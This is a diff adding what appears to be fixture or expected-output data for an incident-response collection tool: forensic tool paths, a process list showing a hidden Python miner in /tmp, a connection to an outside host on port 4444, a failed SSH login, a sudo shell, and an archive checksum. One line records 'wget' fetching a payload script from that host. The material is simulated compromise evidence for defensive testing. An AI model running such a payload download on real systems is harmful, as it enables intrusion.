@@ -1,0 +1,29 @@
+/usr/sbin/tcpdump
+/usr/bin/aide
+/usr/sbin/chkrootkit
+
+USER     PID  %CPU %MEM COMMAND
+root     1842  72.1  1.2 /usr/bin/python3 /tmp/.xminer.py
+toor     1123   3.1  0.5 sshd: toor@pts/0
+
+root 1842 72.1 1.2 /usr/bin/python3 /tmp/.xminer.py
+
+tcp   ESTABLISHED 192.168.1.10:42218 185.203.116.45:4444 python3
+
+LISTEN 0 128 0.0.0.0:4444 users:(("python3",pid=1842))
+
+Failed password for invalid user admin from 185.203.116.45
+
+toor : TTY=pts/0 ; COMMAND=/bin/bash
+
+(no output)
+
+toor pts/0 10:14
+
+Collection complete: /tmp/ir_collection_20260101_103922.tar.gz
+
+e93d1a8c5c9b02e12f6c7a6b8c11a2b0a9e8fbb4e18f2a3b5d9f7a2e1a3b9c8f  ir_collection_20260101_103922.tar.gz
+
+wget http://185.203.116.45/payload.sh
+
+/tmp/.xminer.py
